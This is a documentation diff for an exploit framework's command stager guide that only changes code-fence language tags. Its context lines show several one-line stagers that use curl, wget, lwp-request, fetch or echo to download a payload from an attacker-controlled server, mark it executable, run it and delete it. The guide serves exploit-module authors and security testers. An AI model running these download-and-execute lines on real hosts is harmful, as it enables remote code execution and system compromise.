@@ -99,7 +99,7 @@ However, it is best to set the compatible list of flavors in `CmdStagerFlavor`, 
 **3. Create the execute_command method**
 
 You also must create a ```def execute_command(cmd, opts = {})``` method in your module. This is how you define how to execute a command on the target.  The parameter `cmd` is the command to execute.  When writing the ```execute_cmd``` method, remember that a great deal of work might already be done for you.  Here is an example of a web host that executes a command as part of a request:
-```bigquery
+```ruby
   def execute_command(cmd, _opts = {})
     populate_values if @sid.nil? || @token.nil?
     uri = datastore['URIPATH'] + '/vendor/htmlawed/htmlawed/htmLawedTest.php'
@@ -484,7 +484,7 @@ execute_cmdstager(flavor: :bourne)
 
 The [echo](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/echo.rb) command stager is suitable for multiple platforms except for Windows. It just [echos](http://manpages.ubuntu.com/manpages/trusty/man1/echo.1fun.html) the payload, chmod and execute it. An example of that looks similar to this:
 
-```
+```bash
 echo -en \\x41\\x41\\x41\\x41 >> /tmp/payload ; chmod 777 /tmp/payload ; /tmp/payload ; rm -f /tmp/payload
 ```
 
@@ -527,7 +527,7 @@ execute_cmdstager(flavor: :printf)
 
 The [cURL](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/curl.rb) command stager uses the `curl` command on the target host to download the payload file. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
 
-```
+```bash
 curl -so /tmp/dtNGlaaL http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/dtNGlaaL;/tmp/dtNGlaaL;rm -f /tmp/dtNGlaaL"
 ```
 To use the cURL stager, either specify your CmdStagerFlavor in the metadata:
@@ -547,7 +547,7 @@ execute_cmdstager(flavor: :curl)
 
 The [wget](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/wget.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `wget` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
 
-```
+```bash
 wget -qO /tmp/MZXxujch http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/MZXxujch;/tmp/MZXxujch;rm -f /tmp/MZXxujch
 ```
 
@@ -568,7 +568,7 @@ execute_cmdstager(flavor: :wget)
 
 The [lwp-request](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/lwprequest.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `lwp-request` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
 
-```bigquery
+```bash
 lwp-request -m GET http://10.5.135.201:8080/mdkwKcdGCtU > /tmp/OKOnDYwn;chmod +x /tmp/OKOnDYwn;/tmp/OKOnDYwn;rm -f /tmp/OKOnDYwn
 
 ```
@@ -590,7 +590,7 @@ execute_cmdstager(flavor: :lwprequest)
 
 The [fetch](https://github.com/rapid7/rex-exploitation/blob/master/lib/rex/exploitation/cmdstager/fetch.rb) command stager is similar to the curl command stager, except instead of using curl to download the file on the target host, it uses the `fetch` command. It requires users to specify a `SRVHOST` and `SRVPORT` values and will start an HTTP server to host the payload file. An example of that looks similar to this:
 
-```bigquery
+```bash
 fetch -qo /tmp/UGWuPPcy http://10.5.135.201:8080/mdkwKcdGCtU;chmod +x /tmp/UGWuPPcy;/tmp/UGWuPPcy;rm -f /tmp/UGWuPPcy
 ```
 To use the fetch stager, either specify your CmdStagerFlavor in the metadata:
